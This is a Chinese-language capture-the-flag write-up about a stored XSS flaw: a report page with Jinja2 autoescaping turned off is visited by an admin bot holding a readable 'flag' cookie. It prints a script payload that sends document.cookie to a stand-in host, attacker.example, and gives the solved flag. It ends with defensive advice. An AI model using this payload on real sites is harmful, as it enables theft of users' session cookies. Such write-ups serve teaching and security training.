# getting the staff cookies

## 题目简述

应用允许提交报告，并让 Selenium 管理员访问报告页面。报告内容未经清洗，模板还显式关闭自动转义；管理员访问时会把 Flag 放入名为 `flag` 的非 HttpOnly Cookie。目标是利用存储型 XSS 把该 Cookie 发到攻击者控制的接收端。

## 解题过程

模板直接渲染：

```jinja2
{% autoescape false %}
{{ report }}
{% endautoescape %}
```

管理员机器人先访问同源页面、写入 `flag` Cookie，再重新打开报告链接。因此提交下列报告即可在管理员浏览器中执行：

```html
<script>
location = "https://attacker.example/collect?c="
  + encodeURIComponent(document.cookie);
</script>
```

把示例域名替换为自己可查看请求日志的临时接收端。管理员打开报告后，浏览器会请求 `collect?c=flag%3D...`；URL 解码参数即可得到：

```text
greyhats{4dm1n_cr3d5_acqu1r3d}
```

若请求中没有 Cookie，应先检查接收端 URL 是否为 HTTPS、脚本是否被模板原样渲染，以及 Cookie 是否因路径或 SameSite 设置未附着到报告页面。本题源码中 Cookie 没有设置 HttpOnly，所以 `document.cookie` 可读。

## 方法总结

“管理员会访问用户内容”是存储型 XSS 的强提示。服务端应保持模板自动转义，并对确需富文本的字段使用可靠白名单清洗；敏感 Cookie 还应设置 HttpOnly、Secure 和恰当的 SameSite。只做其中一项不能替代完整防线。
